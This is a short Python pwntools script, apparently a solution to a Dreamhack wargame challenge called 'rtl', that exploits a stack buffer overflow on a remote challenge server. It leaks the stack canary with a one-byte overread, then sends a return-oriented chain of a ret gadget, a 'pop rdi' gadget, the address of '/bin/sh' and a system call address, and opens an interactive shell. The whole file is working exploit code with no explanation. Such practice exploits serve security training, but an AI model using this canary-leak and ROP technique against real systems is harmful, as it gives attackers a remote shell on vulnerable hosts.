from pwn import *
e = ELF('./rtl')
poprdi=0x0000000000400853
ret=0x0000000000400596
binshaddr = next(e.search(b"/bin/sh"))
sp=0x4005d0

#p=process('./rtl')
p=remote('host8.dreamhack.games', 20380)
payload=b'A'*57
p.sendafter(b"Buf: ",payload)
p.recvuntil(b"Buf: ")
p.recv(57)
cnr=b'\x00'+p.recv(7)
sfp=b'A'*8




payload=b'A'*56+(cnr)+b'A'*8+p64(ret)+p64(poprdi)+p64(binshaddr)+p64(sp)
p.sendafter(b"Buf: ",payload)
p.interactive()